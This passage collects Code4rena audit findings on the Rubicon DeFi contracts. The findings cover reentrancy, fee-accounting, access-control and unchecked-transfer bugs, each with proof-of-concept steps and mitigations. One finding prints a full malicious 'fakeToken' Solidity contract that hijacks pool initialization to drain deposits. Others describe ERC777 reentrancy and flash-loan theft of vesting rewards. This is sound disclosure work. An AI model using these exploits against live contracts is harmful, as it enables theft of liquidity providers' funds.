[line 486](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L486) does not have to do anything and its withdraw function should return the WETH balance of ```RubiconRouter.sol```.  5. The ```RubiconRouter.sol``` contract will then [withdraw ETH](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L488) equal to the ```withdrawWETH``` amount, which should be equal to the contract's WETH balance.  6. The caller of the ```withdrawForETH``` function receives the withdraw ETH without providing any WETH.   ## Recommended Mitigation Steps:  Check the contract's WETH balance before the caller is supposed to send the WETH and after the WETH is sent to confirm the contract has received enough WETH from the caller.  
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L557-L568   # Vulnerability details  `BathToken.sol#_deposit()` calculates the actual transferred amount by comparing the before and after balance, however, since there is no reentrancy guard on this function, there is a risk of re-entrancy attack to mint more shares.  Some token standards, such as ERC777, allow a callback to the source of the funds (the `from` address) before the balances are updated in `transferFrom()`. This callback could be used to re-enter the function and inflate the amount.  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L557-L568  ```solidity function _deposit(uint256 assets, address receiver)     internal     returns (uint256 shares) {     uint256 _pool = underlyingBalance();     uint256 _before = underlyingToken.balanceOf(address(this));      // **Assume caller is depositor**     underlyingToken.transferFrom(msg.sender, address(this), assets);     uint256 _after = underlyingToken.balanceOf(address(this));     assets = _after.sub(_before); // Additional check for deflationary tokens     ... ```  ### PoC  With a ERC777 token by using the ERC777TokensSender `tokensToSend` hook to re-enter the `deposit()` function.  Given:   -   `underlyingBalance()`: `100_000e18 XYZ`. -   `totalSupply`: `1e18`  The attacker can create a contracts with `tokensToSend()` function, then:  1.   `deposit(1)`     -   preBalance  = `100_000e18`;     -   `underlyingToken.transferFrom(msg.sender, address(this), 1)` 2. reenter using `tokensToSend` hook for the 2nd call: `deposit(1_000e18)`     -   preBalance  = `100_000e18`;     -   `underlyingToken.transferFrom(msg.sender, address(this), 1_000e18)`     -   postBalance = `101_000e18`;     -   assets (actualDepositAmount) = `101_000e18 - 100_000e18 = 1_000e18`;     -   mint `1000` shares; 3. continue with the first `deposit()` call:     -   `underlyingToken.transferFrom(msg.sender, address(this), 1)`     -   postBalance = `101_000e18 + 1`;     -   assets (actualDepositAmount) = `(101_000e18 + 1) - 100_000e18 = 1_000e18 + 1`;     -   mint `1000` shares;  As a result, with only `1 + 1_000e18` transferred to the contract, the attacker minted `2_000e18 XYZ` worth of shares.  ### Recommendation  Consider adding `nonReentrant` modifier from OZ's `ReentrancyGuard`.   
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L471-L473   # Vulnerability details  ```solidity     function isClosed() public pure returns (bool closed) {         return false;     } ```  > After close, no new buys are allowed.  Based on context and comments, when the market is closed, offers can only be cancelled (offer and buy will throw).   However, in the current implementation, `isClosed()` always returns `false`, so the checks on whether the market is closed will always pass. (E.g: `can_offer()`, `can_buy()`, etc)  And there is a storage variable called `stopped`, but it's never been used, which seems should be used for `isClosed`.  ### Recommendation  Change to:  ```solidity     function isClosed() public pure returns (bool closed) {         return stopped;     } ```  
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathHouse.sol#L153 https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L214   # Vulnerability details  ## Title Malicious pools can be deployed through `BathHouse`  ## Impact Reentrancy in `BathToken.initialize()` can be exploited and this allows to create a pool which has a legitimate underlying token (even one for which a pool already exists), and has given full approval of underlying Token to an attacker. While this underlying token will differ from the one returned by  `BathHouse.getBathTokenfromAsset` for that Pool (since the returned token would be the malicious one which reentered `initialize`), the LPs could still deposit actual legitimate tokens to the pool since it is deployed from the BathHouse and has the same name as a legit pool, and loose their deposit to the attacker.  ## Proof of Concept Create a new pool calling `BathHouse.openBathTokenSpawnAndSignal()` and passing as `newBathTokenUnderlying` the address with the following malicious token:  ```solidity // SPDX-License-Identifier: BUSL-1.1  pragma solidity =0.7.6;  import "@openzeppelin/contracts/token/ERC20/ERC20.sol"; import "@openzeppelin/contracts/access/Ownable.sol"; import "../../contracts/rubiconPools/BathToken.sol";  contract fakeToken is ERC20("trueToken", "TRUE"), Ownable {      ERC20 trueToken;     address marketAddress;     uint256 counterApprove;     BathToken bathToken;      function setTrueToken(address _trueTokenAddress) onlyOwner {         trueToken = ERC20(_trueTokenAddress);     }      function setMarketAddress(address _marketAddress) onlyOwner {         marketAddress = _marketAddress;     }      function approve(address spender, uint256 amount) public virtual override returns (bool) {         if (counterApprove == 1) { //first approve is from bathHouse             bathToken = BathToken(msg.sender);             bathToken.initialize(trueToken, owner, owner);             attacked = false;         }         counterApprove++;         _approve(_msgSender(), spender, amount);         return true;     }      function setAndApproveMarket(address _market){         // sets legitimate market after malicious bathToken initialization         bathToken.setMarket(_market);         bathToken.approveMarket();     }      function emptyPool() onlyOwner {         // sends pool tokens to attacker         uint256 poolBalance = trueToken.balanceOf(address(bathToken));         trueToken.transferFrom(address(bathToken), owner, poolBalance);     } } ```  This reenters `BathToken.initialize()` and reassigns the bathHouse role to the fake token, which names itself as the legit token. Also the reentrant call reassigns the legit Token to `underlyingToken` so thet the pool actually contains the legit token, but gives infinite approval for the legit token from the pool to the attacker, who is passed as `market` in the reentrant call.  Since the fakeToken has the bathHouse role, it can set the market to the actual RubiconMarket after the reentrant call.  Code: [BathHouse.openBathTokenSpawnAndSignal](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathHouse.sol#L153), [BathToken.initialize](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L214)  ## Tools Used Manual analysis  ## Recommended Mitigation Steps Add `onlyBathHouse` modifier to `initialize` function in `BathToken` to avoid reentrancy from malicious tokens.  
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L962   # Vulnerability details  ## Impact  In the `RubiconMarket` contract, buys can be disabled with `setBuyEnabled`. However, if `matchingEnabled` is set to `false`, buys can not be disabled as the `require` check is located in the `_buys` function instead of checking `buyEnabled` in the `buy` function.  ## Proof of Concept  [RubiconMarket.sol#L962](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L962)  ```solidity function _buys(uint256 id, uint256 amount) internal returns (bool) {     require(buyEnabled); // @audit-info Buys can not be disabled if offer matching is disabled - this require statement should be moved to `buy` function     if (amount == offers[id].pay_amt) {         if (isOfferSorted(id)) {             //offers[id] must be removed from sorted list because all of it is bought             _unsort(id);         } else {             _hide(id);         }     }      require(super.buy(id, amount));      // If offer has become dust during buy, we cancel it     if (         isActive(id) &&         offers[id].pay_amt < _dust[address(offers[id].pay_gem)]     ) {         dustId = id; //enable current msg.sender to call cancel(id)         cancel(id);     }     return true; } ```  ## Tools Used  Manual review  ## Recommended mitigation steps  Move the `require` check for `buyEnabled` to the `buy` function [here](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L662).  
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L251   # Vulnerability details  ## Impact  It is a good idea to add a `require()` statement that checks the return value of ERC20 token transfers or to use something like OpenZeppelin’s `safeTransfer()`/`safeTransferFrom()` unless one is sure the given token reverts in case of a failure. Failure to do so will cause silent failures of transfers and affect token accounting in contract.  However, using `require()` to check transfer return values could lead to issues with non-compliant ERC20 tokens which do not return a boolean value. Therefore, it's highly advised to use OpenZeppelin’s `safeTransfer()`/`safeTransferFrom()`.  ## Proof of Concept  **RubiconRouter.sol**  [L251](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L251): `ERC20(route[route.length - 1]).transfer(to, currentAmount);`\ [L303](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L303): `ERC20(buy_gem).transfer(msg.sender, fill);`\ [L320](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L320): `ERC20(buy_gem).transfer(msg.sender, fill);`\ [L348](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L348): `ERC20(buy_gem).transfer(msg.sender, buy_amt);`\ [L377](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L377): `ERC20(pay_gem).transfer(msg.sender, max_fill_amount - fill);`\ [L406](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L406): `ERC20(buy_gem).transfer(msg.sender, _after - _before);`\ [L471](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L471): `ERC20(targetPool).transfer(msg.sender, newShares);`  **peripheral_contracts/BathBuddy.sol**  [L114](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L114): `token.transfer(recipient, amountWithdrawn);`  **rubiconPools/BathPair.sol**  [L601](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathPair.sol#L601): `IERC20(asset).transfer(msg.sender, booty);`\ [L615](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathPair.sol#L615): `IERC20(quote).transfer(msg.sender, booty);`  **rubiconPools/BathToken.sol**  [L353](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L353): `IERC20(filledAssetToRebalance).transfer(`\ [L357](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L357): `IERC20(filledAssetToRebalance).transfer(msg.sender, stratReward); `\ [L602](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L602): `underlyingToken.transfer(feeTo, _fee);`\ [L605](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L605): `underlyingToken.transfer(receiver, amountWithdrawn);`  ## Tools Used  Manual review  ## Recommended mitigation steps  Consider using `safeTransfer()`/`safeTransferFrom()` instead of `transfer()`/`transferFrom()`.  
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L114   # Vulnerability details  ## Impact If a token with callback capabilities is used as a token to vested, then a malicious beneficiary may get the vested amount back without waiting for the vesting period.  ## Proof of Concept  In the function release, line (<https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L87>), there’s no modifier to stop reentrancy, in the other contracts it would be the synchronized modifier. If a token could reenter with a hook in a malicious contract (an ERC777 token, for example, which is backwards compatible with ERC20), released token counter array (<https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L116>) wouldn’t be updated, enabling the withdrawal of the vested amount before the vesting period ends. A plausible scenario would be:  1) A malicious beneficiary contract B calls the release() function with itself as the recipient, everything goes according to the function, and transfer and callback to the malicious beneficiary contract happens.  2) Contract B contains tokensReceived(), a function in the ERC777 token that allows for callback to the victim contract as you can see here https://twitter.com/transmissions11/status/1496944873760428058/ (This function also can be any function that is analogous to a fallback function that might be implemented in a modified ERC20. As it can be seen, any token that would give the attacker control over the execution flow will suffice.)  3) Inside the tokensReceived() function, a call is made back to the release function.  5) This steps are repeated until vested amount is taken back.  4) This allows for the malicious beneficiary contract to redeem the vested amount while bypassing the vesting period, due to the released token counter array (https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L116) which controls how many tokens are released (https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L101) being updated only after the transferring of all tokens occurs. As this is the case, malicious beneficiary  can get the usual amount that they could withdraw at the time indefinite amount of times (as result of released in line 101 will be 0), thus approximately getting all of their vested amount back without waiting for the vesting period. (fees not included).    There's also precedents of similar bugs that reported, as seen here: https://github.com/code-423n4/2022-01-behodler-findings/issues/154#issuecomment-1029448627   ## Tools used Manual code review, talks with dev  ## Recommended Mitigations Steps 1) Consider adding a mutex such as nonReentrant, or the synchronized modifier used in the other contracts.  2) Implement checks-effects-interactions pattern.  
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L290 https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L307   # Vulnerability details  ## Impact The two functions maxSellAllAmount and maxBuyAllAmount will always revert in case at least (100-fee)\% of user's balance can be matched with orders.    ## Proof of Concept Let say Bob placed an order selling 100 USDC with a low USDT price of 1:0.95.  Alice currently has 50 USDT and they want to maxSellAllAmount into USDC.   The function will pass 50 as amount into RubiconMarket's buyAll function where it fully matches with Bob's order. Here, the buy() function will first transfer alice's 50 USDT in and later 50 * feeBPS / BPS as fee. In this case, alice can not afford to pay.   Therefore, the two functions maxSellAllAmount and maxBuyAllAmount are useless in case user's request can be fully matched.  ## Recommended Mitigation Steps  Add the fee calculating before passing the amount to the RubiconMarket's buyAll, sellAll function.   ```solidity     /// @dev this function takes a user's entire balance for the trade in case they want to do a max trade so there's no leftover dust     function maxBuyAllAmount(         ERC20 buy_gem,         ERC20 pay_gem,         uint256 max_fill_amount     ) external returns (uint256 fill) {         //swaps msg.sender's entire balance in the trade                     uint256 maxAmount = _calcAmountAfterFee(ERC20(buy_gem).balanceOf(msg.sender));                  fill = RubiconMarket(RubiconMarketAddress).buyAllAmount(             buy_gem,             maxAmount,             pay_gem,             max_fill_amount         );         ERC20(buy_gem).transfer(msg.sender, fill);     }      /// @dev this function takes a user's entire balance for the trade in case they want to do a max trade so there's no leftover dust     function maxSellAllAmount(         ERC20 pay_gem,         ERC20 buy_gem,         uint256 min_fill_amount     ) external returns (uint256 fill) {         //swaps msg.sender entire balance in the trade          uint256 maxAmount = _calcAmountAfterFee(ERC20(buy_gem).balanceOf(msg.sender));         fill = RubiconMarket(RubiconMarketAddress).sellAllAmount(             pay_gem,             maxAmount,             buy_gem,             min_fill_amount         );         ERC20(buy_gem).transfer(msg.sender, fill);     }       function _calcAmountAfterFee(uint256 amount) internal view returns (uint256) {         uint256 feeBPS = RubiconMarket(RubiconMarketAddress).getFeeBPS();         return amount.sub(amount.mul(feeBPS).div(10000));     } ```    
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L103-L104 https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L133   # Vulnerability details   ## Impact  When a whale withdraws their tokens and receives rewards from the `BathBuddy` contract the fees they pay will erroneously become part of the calculation performed in function `vestedAmount`. This means that any subsequent withdrawer of funds may receive a disproportionate amount of tokens. The fees paid by a whale could still be much larger than the amount of tokens invested by a minnow.  Althought similar to the issue "When `BathToken` contract is recipient of fees then users can make disproportionate returns after whales withdraw" it is not the same issue since fees are always accrued in the `BathBuddy` contract and this cannot be changed. Also, the calculations in are subtly different  However, the outcome is the same. A minnow can receive a disproportionate reward and drain much of the fees from the contract.  The intention of setting the pool as the recipient of the fees was to reward HODLers but, in fact, they will be incentivised to withdraw after a whale does.  ## Proof of Concept  Consider the following scenario.  1. fee is set to 50 BPS (i.e. 0.50%) 2. A whale deposits 200 tokens 3. A minnow deposits 0.01 tokens 4. A `BathBuddy` contract is set up for the `BathToken` contract. 5. The whale withdraws their funds 6. The minnow then withdraws their funds  After step 5, the function `vestedAmount` will return a value that includes the fees paid by the whale. This is because the `BathBuddy` contract is the recipient of all fees. They are not transferred anywhere.  Thus, when the minnow withdraws their funds `releasable` is much larger than the amount they otherwise would have expected. Further [sharesWithdrawn](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L103) is equal to [initialTotalSupply](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L104) in this particular scenario so `mul(sharesWithdrawn).div(initialTotalSupply)` evaluates to `1`. This means that `amount = releaseable`.  A [test](https://github.com/sseefried/codearena-rubicon-2022-05/blob/f5010d845d3713b07a00f3bb96a5608c6d09b047/test/BugsBathBuddy.js#L55-L145) has been written in the private fork that exhibits this behaviour.  ## Tools Used  Manual inspection  ## Recommended Mitigation Steps  Keep a tally of the fees accrued in a separate variable and work out a fairer system for distributing rewards to HODLers.  
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/tree/main/contracts/rubiconPools/BathPair.sol#L591-L625   # Vulnerability details  ## Impact Strategists can take more rewards than they should using the function strategistBootyClaim(). Even though the owner trusts strategists fully I think it's recommended to remove such flaws. I think there would be 2 methods to claim more rewards.   ## Proof of Concept Method 1. A strategist can call the function using same asset/quote parameters. Then both of fillCountA and fillCountQ will be same positive values. The first code block for fillCountA(L597-L610) will work same as expected but the second block for fillCountQ(L611-L624) will be executed for the same asset again. Two mappings(totalFillsPerAsset, strategist2Fills) that save rewards will be updated for asset already after the first block  but totalFillsPerAsset and balance of this contract for quote would be still positive as there would be remaining rewards for other strategiets. So the strategist can get paid once more for the same asset.  Method 2. I think a reentrancy attack is possible also because two mappings are updated after transfer funds.  ## Tools Used Solidity Visual Developer of VSCode  ## Recommended Mitigation Steps For Method 1. You can add this require() at the beginning of function.(L595) require(asset != quote, "asset = quote");  For Method 2. You can update the state of 2 mappings before transfer. Move L608-L609 to L601 Move L622-L623 to L615  So final code will look like this.(pseudocode)  function strategistBootyClaim(address asset, address quote)     external     onlyApprovedStrategist(msg.sender) {     require(asset != quote, "asset = quote");      uint256 fillCountA = strategist2Fills[msg.sender][asset];     uint256 fillCountQ = strategist2Fills[msg.sender][quote];     if (fillCountA > 0) {         uint256 booty = (             fillCountA.mul(IERC20(asset).balanceOf(address(this)))         ).div(totalFillsPerAsset[asset]);          totalFillsPerAsset[asset] -= fillCountA;         strategist2Fills[msg.sender][asset] -= fillCountA;          IERC20(asset).transfer(msg.sender, booty);         emit LogStrategistRewardClaim(             msg.sender,             asset,             booty,             block.timestamp         );     }     if (fillCountQ > 0) {         uint256 booty = (             fillCountQ.mul(IERC20(quote).balanceOf(address(this)))         ).div(totalFillsPerAsset[quote]);          totalFillsPerAsset[quote] -= fillCountQ;         strategist2Fills[msg.sender][quote] -= fillCountQ;          IERC20(quote).transfer(msg.sender, booty);         emit LogStrategistRewardClaim(             msg.sender,             quote,             booty,             block.timestamp         );     } }  
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathToken.sol#L499   # Vulnerability details  The fee is wrongly accounted for in `previewWithdraw`.  ## Impact Function returns wrong result; Additionally, `withdraw(assets,to,from)` will always revert. (The user can still withdraw his assets via other functions).  ## Proof of Concept The `previewWithdraw` function returns *less* shares than the required assets (notice the substraction): ```             uint256 amountWithdrawn;             uint256 _fee = assets.mul(feeBPS).div(10000);             amountWithdrawn = assets.sub(_fee);             shares = convertToShares(amountWithdrawn); ``` This won't work, because if the user wants to receive amount of `assets`, he needs to burn *more* shares than that to account for the fee. Not less. This will also make `withdraw(assets,to,from)` [revert](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathToken.sol#L514:#L519), because it takes the amount of shares from `previewWithdraw`, and then checks how much assets were really sent to the user, and verifies that it's at least how much he asked for: ```         uint256 expectedShares = previewWithdraw(assets);         uint256 assetsReceived = _withdraw(expectedShares, receiver);         require(assetsReceived >= assets, "You cannot withdraw the amount of assets you expected"); ``` But since the expectedShares is smaller than the original amount, and since `_withdraw` [deducts](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathToken.sol#L604) the fee from expectedShares, then always `assets > assetsReceived`, and the function will revert.  ## Recommended Mitigation Steps The amount of shares that `previewWithdraw` should return is: `convertToShares(assets.add(assets.mul(feeBPS).div((10000.sub(feeBPS))))` I prove this mathematically in [this](https://i.ibb.co/hX41vzV/c4wd.jpg) image.  
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathHouse.sol#L264   # Vulnerability details  There is no option to revoke strategist's privilege. As the strategist is a very strategic role which can effectively steal LP's funds, this is very dangerous.  ## Impact A rogue / compromised / cancelled strategist can not be revoked of permissions.  ## Proof of Concept There's a function to [approve](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathHouse.sol#L264) a strategist, but no option to revoke the access.  ## Recommended Mitigation Steps Add a function / change the function and allow setting strategist's access to false.  
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L557   # Vulnerability details  ## Background  A transfer-on-fee token or a deflationary/rebasing token, causing the received amount to be less than the accounted amount. For instance, a deflationary tokens might charge a certain fee for every transfer() or transferFrom()  Rubicon Finance supports the trading of any ERC20 token, and anyone can liquidity pool for a new token. Thus, it is possible that such a transfer-on-fee token or a deflationary/rebasing token be used in the protocol.  Based on the source code and comment of `BathToken._deposit()`, it appears that the team is aware of this issue, and proactively implemented control (before & after balance checks) to deal with deflationary tokens.  [https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L557](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L557)  ```solidity function _deposit(uint256 assets, address receiver)     internal     returns (uint256 shares) {     uint256 _pool = underlyingBalance();     uint256 _before = underlyingToken.balanceOf(address(this));      // **Assume caller is depositor**     underlyingToken.transferFrom(msg.sender, address(this), assets);     uint256 _after = underlyingToken.balanceOf(address(this));     assets = _after.sub(_before); // Additional check for deflationary tokens      (totalSupply == 0) ? shares = assets : shares = (         assets.mul(totalSupply)     ).div(_pool);      // Send shares to designated target     _mint(receiver, shares);     ..SNIP.. } ```  However, such control was not consistently applied across the protocol, and might cause the internal accounting of the orderbook to be incorrect.  ## Proof-of-Concept  If the `pay_gem` token is an deflationary token, the `info.pay_amt` and the actual amount of `pay_gem` tokens received will not be in sync.   For instance, assume that  XYZ token is a deflation token that charges 10% fee for every transfer. If an `offer(100, XYZ, 100, DAI)` is executed, an order with 100 XYZ (pay) and 100 DAI (buy) will be added to the orderbook. However, the orderbook will only received 90 XYZ, thus only 90 XYZ is ecrowed in the orderbook. This discrepancy would break the internal accounting system of the order book.  [https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L392](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L392)  ```solidity /// @notice Key function to make a new offer. Takes funds from the caller into market escrow. function offer(     uint256 pay_amt,     ERC20 pay_gem,     uint256 buy_amt,     ERC20 buy_gem ) public virtual can_offer synchronized returns (uint256 id) {     ..SNIP..     OfferInfo memory info;     info.pay_amt = pay_amt;     info.pay_gem = pay_gem;     info.buy_amt = buy_amt;     info.buy_gem = buy_gem;     info.owner = msg.sender;     info.timestamp = uint64(block.timestamp);     id = _next_id();     offers[id] = info;      require(pay_gem.transferFrom(msg.sender, address(this), pay_amt));     ..SNIP.. } ```  ## Impact  The internal accounting system of the order book would be inaccurate or break, affecting the protocol operation.  ## Recommended Mitigation Steps  In the `offer` function, get the actual received amount by calculating the difference of token balance before and after the transfer, and set the `info.pay_amt` to the actual received amount.  Alternatively, the team might want to consider implementing whitelisting mechanism so that deflationary tokens will not be supported if the risk of allowing permissionless creation of pool with arbitrary token deems to be significant. A DAO may be formed in the future to manage the whitelisting.  
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L87   # Vulnerability details  ## Background  BathBuddy is a Vesting Wallet that payout withdrawers any `bonusTokens` they may have accrued while staking in the Bath Token (e.g. network incentives/governance tokens).  BathBuddy Vesting Wallet releases a user their relative share of the pool’s total vested bonus token during the withdraw call on BathToken.sol. This vesting occurs linearly over Unix time.  It was observed that an attacker could steal almost all the `bonusTokens` in the BathBuddy Vesting Wallet.  ## Proof-of-Concept  The root cause of this issue is that the amount of `bonusTokens` that a user is entitled to is based on their relative share of the pool’s total vested bonus token at the point of the withdraw call. It is calculated based on the user's "spot" share in the pool. Thus, it is possible for an attacker to deposit large amount of tokens into a BathToken Pool to gain significant share of the pool (e.g. 95%), and then withdraw the all the shares immediately. The withdraw call will trigger the `BathToken.distributeBonusTokenRewards`, and since attacker holds overwhelming amount of share in the pool, they will receive almost all the `bonusToken` in the BathBuddy Vesting wallet, leaving behind dust amount of `bonusToken` in the wallet. This could be perform in an atomic transaction and attacker can leverage on flash-loan to fund this attack.  The following shows an example of this issue:  1. A sponsor sent 1000 DAI to the BathBuddy Vesting Wallet to be used as `bonusTokens` for bathWETH pool. The vesting duration is 4 weeks. 2. Alice and Bob deposited 50 WETH and 50 WETH respectively. The total underlying asset of bathWETH is 100 WETH after depositing. Each of them hold 50% of the shares in the pool. 3. Fast forward to the last hour of the vesting period, most of the `bonusToken` have been vested and ready for the recipients to claim. In this example, estimate 998 DAI are ready to be claimed at the final hour. 4. Since Alice has 50% stake in the pool, she should have accured close to 449 DAI at this point. If she decided to withdraw all her bathWETH LP tokens at this point, she would receive close to 449 DAI as `bonusTokens`. But she choose not to withdraw yet. 5. Unfortunately, an attacker performed a flash-loan to borrow 8500 WETH, and deposit large amount of WETH into the bathWETH gain significant share of the pool, and then withdraw the all the shares immediately. 6. Since attacker hold the an overwhelming amount of shares in the pool, they will receive almost all the `bonusToken` (around 997 DAI) in the BathBuddy Vesting wallet, leaving behind dust amount of `bonusToken` in the wallet. 7. At this point, Alice decided to withdraw all her bathWETH LP token. She only received dust amount of 0.7 DAI as `bonusTokens`  The following code shows that the amount of `bonusTokens` a user is entitled is based on the user's current share in the pool - `amount = releasable * sharesWithdrawn/initialTotalSupply`.  [https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L87](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L87)  ```solidity /// @inheritdoc IBathBuddy /// @dev Added and modified release function. Should be the only callable release function function release(     IERC20 token,     address recipient,     uint256 sharesWithdrawn,     uint256 initialTotalSupply,     uint256 poolFee ) external override {     require(         msg.sender == beneficiary,         "Caller is not the Bath Token beneficiary of these rewards"     );     uint256 releasable = vestedAmount(         address(token),         uint64(block.timestamp)     ) - released(address(token));     if (releasable > 0) {         uint256 amount = releasable.mul(sharesWithdrawn).div(             initialTotalSupply         );         uint256 _fee = amount.mul(poolFee).div(10000);          ..SNIP..          uint256 amountWithdrawn = amount.sub(_fee);         token.transfer(recipient, amountWithdrawn);          _erc20Released[address(token)] += amount;         ..SNIP..     } } ```  ## Test Scripts  Following is the test output that demostrate the above scenario:  ```javascript   Contract: Rubicon Exchange and Pools Original Tests     Deployment       ✓ is deployed (1783ms)     Bath House Initialization of Bath Pair and Bath Tokens       ✓ Bath House is deployed and initialized (66ms)         new bathWETH! 0x237eda6f0102c1684caEbA3Ebd89e26a79258C6f       ✓ WETH Bath Token for WETH asset is deployed and initialized (131ms)       ✓ Init BathBuddy Vesting Wallet and Add BathBuddy to WETH BathToken Pool (54ms)       ✓ Bath Pair is deployed and initialized w/ BathHouse (59ms)         undefined       ✓ Alice deposit 50 WETH to WETH bathTokens (137ms)         undefined       ✓ Bob deposit 50 WETH to WETH bathTokens (174ms) bathAssetInstance.bonusTokens.length = 1 bathBuddyInstance (Vesting Wallet) has 1000 DAI bathBuddyInstance.vestedAmount(DAI) = 0.000413359788359788 bathBuddyInstance.vestedAmount(DAI) = 500.000413359788359788 (End of 2nd week) bathBuddyInstance.vestedAmount(DAI) = 998.512318121693121693 (Last hour of the vesting period) 0 DAI has been released from 